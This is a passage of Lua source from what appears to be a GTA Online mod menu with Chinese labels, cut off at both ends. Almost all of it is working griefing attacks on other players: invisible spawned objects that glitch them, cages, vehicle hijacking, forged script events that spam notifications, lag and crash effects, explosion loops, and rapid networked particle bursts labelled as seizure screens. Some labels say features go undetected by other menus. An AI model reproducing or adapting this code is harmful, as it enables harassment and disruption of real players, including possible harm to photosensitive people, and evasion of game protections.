        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        if not players.exists(pid) then 
            util.toast("玩家不存在. :/")
            menu.set_value(glitchPlayer_toggle, false)
        util.stop_thread() end

        if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
        and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
            util.toast("玩家离得太远. :/")
            menu.set_value(glitchPlayer_toggle, false)
        return end

        local glitch_hash = object_hash
        local poopy_butt = util.joaat("rallytruck")
        request_model(glitch_hash)
        request_model(poopy_butt)
        local stupid_object = entities.create_object(glitch_hash, pos)
        local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
        ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
        ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
        ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        util.yield(delay)
        entities.delete_by_handle(stupid_object)
        entities.delete_by_handle(glitch_vehicle)
        util.yield(delay)     
    end)

    local glitchVehCmd
    glitchVehCmd = player_toggle_loop(griefing, pid, "鬼畜载具", {"glitchvehicle"}, "在所有的菜单上都能工作，并且不会被检测.", function() -- credits to soul reaper for base concept
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_model = players.get_vehicle_model(pid)
        local ped_hash = util.joaat("a_m_m_acult_01")
        local object_hash = util.joaat("prop_ld_ferris_wheel")
        request_model(ped_hash)
        request_model(object_hash)
        
        if not players.exists(pid) then 
            util.toast("玩家不存在. :/")
            menu.set_value(glitchPlayer_toggle, false)
        util.stop_thread() end

        if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then 
            util.toast("玩家不在车内. :/")
            menu.set_value(glitchVehCmd, false)
        return end

        if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
        and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
            util.toast("玩家离得太远. :/")
            menu.set_value(glitchVehCmd, false)
        return end

        if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
            util.toast("没有座位了. :/")
            menu.set_value(glitchVehCmd, false)
        return end

        local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
        local glitch_obj = entities.create_object(object_hash, pos)
        local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
        local things = {glitched_ped, glitch_obj}
        
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitched_ped)

        ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)

        for i, spawned_objects in ipairs(things) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
            ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
            ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
        end

        for i = 0, seat_count -1 do
            if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                local emptyseat = i
                for l = 1, 25 do
                    PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                    ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                    util.yield()
                end
            end
        end
        if glitched_ped ~= nil then
            entities.delete_by_handle(glitched_ped) 
        end
        if glitch_obj ~= nil then 
            entities.delete_by_handle(glitch_obj)
        end
    end)

    local glitchforcefield
    glitchforcefield = player_toggle_loop(griefing, pid, "大范围力场", {"forcefield"}, "被具有实体垃圾邮件保护功能的菜单所阻止.", function()
        local glitch_hash = util.joaat("p_spinning_anus_s")
        request_model(glitch_hash)

        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
        
        if not players.exists(pid) then 
            util.toast("玩家并不存在. :/")
            menu.set_value(glitchPlayer_toggle, false)
        util.stop_thread() end

        if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
        and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
            util.toast("玩家离得太远. :/")
            menu.set_value(glitchPlayer, false)
        return end

        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            util.toast("玩家在载具里. :/")
            menu.set_value(glitchforcefield, false)
        return end

        local stupid_object = entities.create_object(glitch_hash, playerpos)
        ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
        util.yield()
        entities.delete_by_handle(stupid_object)
        util.yield()    
    end)

    menu.click_slider(griefing, "虚假抢劫", {}, "", 0, 2147483647, 0, 1000, function(amount)
        util.trigger_script_event(1 << pid, {2041805809, players.user(), 244034214, amount, 0, 0, 0, 0, 0, 0, pid, players.user(), 0, 0})
        util.trigger_script_event(1 << players.user(), {2041805809, players.user(), 244034214, amount, 0, 0, 0, 0, 0, 0, pid, players.user(), 0, 0})
    end)

    local cageas = menu.list(griefing, "困住玩家", {}, "已被大部分菜单阻挡")
    menu.action(cageas, "电击笼子", {"electriccage"}, "你要当索尔还是美国队长？", function()
        local number_of_cages = 6
        local elec_box = util.joaat("prop_elecbox_12")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(2.5)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
                obj_pos.z += 0.75
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
    end)

    menu.action(cageas, "集装箱笼子", {"containercage"}, "", function()
        local container_hash = util.joaat("prop_container_ld_pu")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        pos.z -= 1
        local container = entities.create_object(container_hash, pos, 0)
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)

    menu.action(cageas, "载具笼子", {"vehiclecage"}, "", function()
        local container_hash = util.joaat("boxville3")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.SET_ENTITY_VISIBLE(container, false)
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)

    menu.action(cageas, "删除所有生成的笼子", {"clearcages"}, "", function()
        local entitycount = 0
        for i, object in ipairs(spawned_objects) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            entities.delete_by_handle(object)
            spawned_objects[i] = nil
            entitycount += 1
        end
        util.toast("已经删除了 " .. entitycount .. " 个生成的笼子")
    end) 

    menu.action(griefing, "劫持车辆", {"hijack"}, "生成一个NPC，把他从车里扔出来并开走他的车.", function() -- add personal vehicle check
        local veh = {1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12}
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        local veh_speed = ENTITY.GET_ENTITY_SPEED(vehicle)

        if not PED.IS_PED_IN_VEHICLE(ped, vehicle, false) then
            util.toast("玩家不在车内（使用载具功能时请先观看玩家是否在车内）. :/")
        return end
        
        for _, id in ipairs(veh) do
            if class == id and veh_speed > 3.0 then
                util.toast("这个现在还不能用. :/")
            return end
        end

        local spawned_ped = PED.CREATE_RANDOM_PED(pos.x, pos.y - 10, pos.z)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_ped)
        entities.set_can_migrate(entities.handle_to_pointer(spawned_ped), false)
        ENTITY.SET_ENTITY_INVINCIBLE(spawned_ped, true)
        ENTITY.SET_ENTITY_VISIBLE(spawned_ped, false)
        ENTITY.FREEZE_ENTITY_POSITION(spawned_ped, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(spawned_ped, true)
        PED.CAN_PED_RAGDOLL(spawned_ped, false)
        TASK.TASK_ENTER_VEHICLE(spawned_ped, vehicle, 1000, -1, 1.0, 2|8|16)
        util.yield(3000)
        TASK.TASK_VEHICLE_DRIVE_WANDER(spawned_ped, vehicle, 9999.0, 6)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(spawned_ped, false)
        util.yield(5000)
        if not PED.IS_PED_IN_ANY_VEHICLE(spawned_ped, false) then
            entities.delete_by_handle(spawned_ped)
        end
        if PED.IS_PED_IN_VEHICLE(ped, vehicle, false) then
            util.toast("未能劫持玩家的载具. :/")
        end
        TASK.TASK_VEHICLE_DRIVE_WANDER(spawned_ped, vehicle, 9999.0, 6) -- setting task a 2nd time since it seems to solve any issues of the ped not wandering off.
    end)

    menu.toggle_loop(jindianegao, "大风车", {"Windmills"}, "", function(on_toggle)
        if players.exists(pid) then
        windmills(pid)
        end
    end)

	menu.toggle_loop(jindianegao, "折腾玩家", {"tossplayers"}, "在玩家身上循环无损伤的爆炸", function()
        local playerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), true)

        SE_add_explosion(playerCoords['x'], playerCoords['y'], playerCoords['z'], 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
    end)	
	local glitch_player_list = menu.list(jindianegao, "鬼畜玩家", {"glitchdelay"}, "")
    local object_hash = util.joaat("prop_ld_ferris_wheel")
    menu.list_select(glitch_player_list, "物体", {}, "选择鬼畜玩家使用的物体.", object_stuff.names, 1, function(index)
        object_hash = util.joaat(object_stuff.objects[index])
    end)

    menu.toggle_loop(jindianegao, "外星人入侵", {}, "", function(toggle)
        ufffo()
    end)

    menu.toggle_loop(jindianegao, "外星人爆炸循环", {"ufoloop"}, "模拟外星人入侵", function()
        if players.exists(pid) then
        alien_explosion_loop(pid)
    end
end)

    menu.slider(glitch_player_list, "物体生成延迟", {"spawndelay"}, "", 0, 3000, 50, 10, function(amount)
        delay = amount
    end)

    local glitchPlayer = false
    local glitchPlayer_toggle
    glitchPlayer_toggle = menu.toggle(glitch_player_list, "启用", {}, "", function(toggled)
        glitchPlayer = toggled

        while glitchPlayer do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("这傻逼超出你的范围了 没法整. :/")
                menu.set_value(glitchPlayer_toggle, false)
            break end

            if not players.exists(pid) then 
                util.toast("找不到这傻逼,看看他还在战局吗?")
                menu.set_value(glitchPlayer_toggle, false)
            util.stop_thread() end

            local glitch_hash = object_hash
            local poopy_butt = util.joaat("rallytruck")
            request_model(glitch_hash)
            request_model(poopy_butt)
            local stupid_object = entities.create_object(glitch_hash, pos)
            local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(delay)
            entities.delete_by_handle(stupid_object)
            entities.delete_by_handle(glitch_vehicle)
            util.yield(delay)    
        end
    end)

    local soundspam = menu.list(jindianegao, "信息轰炸", {}, "")
    player_toggle_loop(soundspam, pid, "垃圾短信", {}, "", function()
        util.trigger_script_event(1 << pid, {0x6396E29C, pid, math.random(-2147483647, 2147483647)})
        util.yield()
    end)

    player_toggle_loop(soundspam, pid, "室内邀请", {}, "", function()
        util.trigger_script_event(1 << pid, {0x4246AA25, pid, math.random(1, 0x6)})
        util.yield()
    end)

    player_toggle_loop(soundspam, pid, "资产邀请", {}, "", function()
        util.trigger_script_event(1 << pid, {0xD829EA3E, pid, math.random(1, 0x96), -1, -1})
        util.yield()
    end)

    player_toggle_loop(soundspam, pid, "收集检查点", {}, "", function()
        util.trigger_script_event(1 << pid, {0xA4D43510, pid, 0xDF607FCD, 0, 0, 0, 0, 0, 0, 0, pid, 0, 0, 0})
        util.yield(25)
    end)

    player_toggle_loop(soundspam, pid, "NPC短信通知", {}, "", function()
        util.trigger_script_event(1 << pid, {0xDA29E2BC, pid, math.random(0, 0xB2), 0, 0, 0})
        util.yield()
    end)

    player_toggle_loop(soundspam, pid, "错误通知", {}, "", function()
        util.trigger_script_event(1 << pid, {0xB56CA233, pid, math.random(-2147483647, 2147483647)})
        util.yield()
    end)    

    local control_veh = false
    local control_veh_cmd
    control_veh_cmd = menu.toggle(jindianegao, "控制玩家车辆", {}, "必须在陆地上的车辆中才可以使用.", function(toggle)
        control_veh = toggle

        while control_veh do 
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)
            local class = VEHICLE.GET_VEHICLE_CLASS(player_veh)
            if not players.exists(pid) then util.stop_thread() end

            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("玩家太远了. :/")
                menu.set_value(control_veh_cmd, false)
            return end

            if class == 15 then
                util.toast("玩家在直升机上. :/")
                menu.set_value(control_veh_cmd, false)
            break end
            
            if class == 16 then
                util.toast("玩家在飞机上. :/")
                menu.set_value(control_veh_cmd, false)
            return end

            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                if PAD.IS_CONTROL_PRESSED(0, 34) then
                    while not PAD.IS_CONTROL_RELEASED(0, 34) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                    while not PAD.IS_CONTROL_RELEASED(0, 35) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                    while not PAD.IS_CONTROL_RELEASED(0, 32) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                    while not PAD.IS_CONTROL_RELEASED(0, 33) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                        util.yield()
                    end
                end
            else
                util.toast("玩家不在车内. :/")
                menu.set_value(control_veh_cmd, false)
            end
            util.yield()
        end
    end)

	menu.toggle_loop(jindianegao, "原子弹轰炸", {"atomicbomb"}, "", function(on_click)
        do
        orbital(pid)
        end
    end)
                   
    menu.toggle_loop(jindianegao,"火箭雨", {'rockets'}, '', function()
        rain_rockets(pid, false)
        util.yield(500)
    end)

    menu.toggle_loop(jindianegao,"将玩家推向前方", {"pushplayerforward"}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("prop_shuttering03")
        request_model(glitch_hash)
        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 1, 0))
        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 0))
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)
        util.yield()
        entities.delete_by_handle(dumb_object_front)
        entities.delete_by_handle(dumb_object_back)
        util.yield() 
    end)

    player_toggle_loop(jindianegao,pid, "弹飞玩家", {}, "也适用于载具", function() 
        local poopy_butt = util.joaat("adder")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        pos.z -= 10
        request_model(poopy_butt)
        local vehicle = entities.create_vehicle(poopy_butt, pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(vehicle, false)
        util.yield(250)
        if vehicle ~= 0 then
            ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 100, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(250)
            entities.delete_by_handle(vehicle)
        end
    end)

    local glitchForcefield = false
    local glitchforcefield_toggle
    glitchforcefield_toggle = menu.toggle(jindianegao, "范围删除", {}, "启用后会将此玩家附近的模型删除", function(toggled)
        glitchForcefield = toggled
        local glitch_hash = util.joaat("p_spinning_anus_s")
        request_model(glitch_hash)

        while glitchForcefield do
            local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
            
            if PED.IS_PED_IN_ANY_VEHICLE(player, true) then
                util.toast("玩家在载具中. :/")
                menu.set_value(glitchforcefield_toggle, false);
            break end
            
            local stupid_object = entities.create_object(glitch_hash, playerpos)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            util.yield()
            entities.delete_by_handle(stupid_object)
            util.yield()    
        end
    end)

    menu.toggle_loop(jindianegao, "烟雾掉帧", {"lag"}, "大部分菜单未检测", function()
        smokelagg(pid) 
    end)

    blurred_screen = menu.list(jindianegao, "闪屏", {}, "", function(); end)

    menu.toggle_loop(blurred_screen, "闪屏V1", {"seizurev1"}, "晃动屏幕", function()
        seizurev1(pid) 
    end)

    menu.toggle_loop(blurred_screen, "闪屏V2", {"seizurev2"}, "晃动屏幕", function()
        seizurev2(pid) 
    end)

    menu.toggle(blurred_screen, "闪屏 V3", {"seizurev3"}, "", function(on_toggle)
        if players.exists(pid) then
    if on_toggle then
            menu.trigger_commands("seizurev1" .. players.get_name(pid))
            menu.trigger_commands("seizurev2" .. players.get_name(pid))
    else
            menu.trigger_commands("seizurev1" .. players.get_name(pid))
            menu.trigger_commands("seizurev2" .. players.get_name(pid))
        end
    end
end)

    menu.toggle(blurred_screen, "闪屏 4", {""}, "请远离该玩家", function(state)
        huaping_1 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_1 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "闪屏 V5", {""}, "请远离该玩家", function(state)
        huaping_2 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_2 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_paint_cans", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false) 
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "闪屏 V6", {""}, "请远离该玩家", function(state)
        huaping_3 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_3 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "闪屏 V7", {""}, "请远离该玩家", function(state)
        huaping_4 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_4 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_sht_extinguisher_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "闪屏 V8", {""}, "请远离该玩家", function(state)
        huaping_5 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_5 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "闪屏 V9", {""}, "请远离该玩家", function(state)
        huaping_6 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_6 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_blue", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "闪屏 V10", {""}, "请远离该玩家", function(state)
        huaping_7 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_7 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_greyblack", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "闪屏 V11", {""}, "请远离该玩家", function(state)
        huaping_8 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_8 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_orange", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "闪屏 V12", {""}, "请远离该玩家", function(state)
        huaping_9 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_9 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    local YuleArmy = menu.list(jindianegao, "圣诞怪兽军队", {}, "")

    menu.toggle(YuleArmy, "圣诞怪兽", {"toggleyulemonster"}, "可能导致该玩家崩溃", function(on_toggle)
        if players.exists(pid) then
        if on_toggle then
            menu.trigger_commands("yulearmy" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        else
            menu.trigger_commands("clearyules" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("superclear")
            end  
        end      
    end)

    menu.click_slider(YuleArmy, "生成圣诞怪兽军队", {"yulearmy"}, "", 1, 48, 48, 1, function(val)
        local player_Yule_army = {}
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        pos.y = pos.y - 5
        pos.z = pos.z + 1
        local Yule = util.joaat("U_M_M_YuleMonster")
        request_model(Yule)
        for i = 1, val do
        player_Yule_army[i] = entities.create_ped(28, Yule, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(player_Yule_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_Yule_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(player_Yule_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_Yule_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
        WEAPON.GIVE_WEAPON_TO_PED(player_Yule_army[i], util.joaat('WEAPON_CANDYCANE'),  9999, true, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(player_Yule_army[i], 20, true)
        PED.SET_PED_SHOOT_RATE(player_Yule_army[i], 1000)
        util.yield()
        end 
    end)

    menu.action(YuleArmy, "清除圣诞怪兽", {"clearyules"}, "", function()
        for i, ped in ipairs(entities.get_all_peds_as_handles()) do
            if PED.IS_PED_MODEL(ped, util.joaat("U_M_M_YuleMonster")) then
                entities.delete_by_handle(ped)
            end
        end
    end)

    menu.toggle_loop(jindianegao, "让他走路带火", {"footfire"}, "烫得很啊！！!", function()
        local coords = players.get_position(pid)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 38, 0, false, false, 0, false)
        util.yield(65)
    end)

    menu.toggle(jindianegao, "撒尿", {"peeloop"}, "随地大小便应该遭到谴责", function(state)
        peeloop_player(pid)
    end)

    menu.toggle(jindianegao, "附加到玩家", {"peeloop"}, "", function(on)
        if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) == players.user_ped() then 
            util.toast("不能附加自己")
            return
        end
        if on then
